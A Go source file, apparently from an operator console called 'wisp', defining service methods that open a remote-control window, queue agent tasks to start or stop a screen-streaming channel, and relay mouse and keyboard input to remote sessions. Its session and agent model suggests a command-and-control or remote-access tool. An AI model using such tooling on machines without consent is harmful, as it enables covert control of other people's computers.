package services

// Remote control (RCP) service methods. These manage the long-lived,
// sleep-independent screen streaming channel plus the dedicated OS window.

import (
	"encoding/json"
	"fmt"

	"github.com/user/wisp/shared/protocol"
	"github.com/wailsapp/wails/v3/pkg/application"
)

// OpenRemoteControlWindow opens a separate OS window rendering the remote
// control view for the session (frontend route "/?view=rc&session=<id>").
func (ss *SessionService) OpenRemoteControlWindow(sessionID string) error {
	if sessionID == "" {
		return fmt.Errorf("session id is required")
	}
	app := ss.serverSvc.GetApp()
	if app == nil {
		return fmt.Errorf("wails app is not ready")
	}
	title := "Remote Control"
	if sess, err := ss.serverSvc.GetDB().GetSession(sessionID); err == nil && sess.Hostname != "" {
		title = fmt.Sprintf("Remote Control — %s (%s)", sess.Hostname, sess.Username)
	}
	app.Window.NewWithOptions(application.WebviewWindowOptions{
		Title:  title,
		Width:  960,
		Height: 640,
		URL:    "/?view=rc&session=" + sessionID,
	}).Show()
	return nil
}

// RemoteControlOpen asks the agent to connect to the RCP channel. proto selects
// the transport: "kcp" (default, fast UDP-based remote control) or "tcp". The
// channel port is chosen automatically by the listener and passed inside the
// task together with the transport so the agent dials the right socket.
func (ss *SessionService) RemoteControlOpen(sessionID, proto string) error {
	if sessionID == "" {
		return fmt.Errorf("session id is required")
	}
	if proto == "" {
		proto = "kcp"
	}
	if proto != "tcp" && proto != "kcp" {
		return fmt.Errorf("unsupported rcp transport: %s", proto)
	}
	port, err := ss.serverSvc.GetServer().EnsureRCP(proto)
	if err != nil {
		return err
	}
	args, err := json.Marshal(map[string]any{"port": port, "proto": proto})
	if err != nil {
		return err
	}
	_, err = ss.serverSvc.GetDB().CreateTask(sessionID, int(protocol.CmdRCPConnect), string(args))
	return err
}

// RemoteControlClose disconnects the agent's RCP channel and tells it to stop.
func (ss *SessionService) RemoteControlClose(sessionID string) error {
	if sessionID == "" {
		return fmt.Errorf("session id is required")
	}
	// Ask the agent to tear down its client, then close the server side too
	if _, err := ss.serverSvc.GetDB().CreateTask(sessionID, int(protocol.CmdRCPDisconnect), "{}"); err != nil {
		return err
	}
	ss.serverSvc.GetServer().CloseRCPChannel(sessionID)
	return nil
}

// RemoteControlInput forwards a mouse / keyboard event over the RCP channel.
// inputJSON: {"type":"move"|"click"|"key","x":..,"y":..,"button":"left","code":..,"down":bool}
func (ss *SessionService) RemoteControlInput(sessionID, inputJSON string) error {
	if sessionID == "" {
		return fmt.Errorf("session id is required")
	}
	return ss.serverSvc.GetServer().SendRCPInput(sessionID, []byte(inputJSON))
}
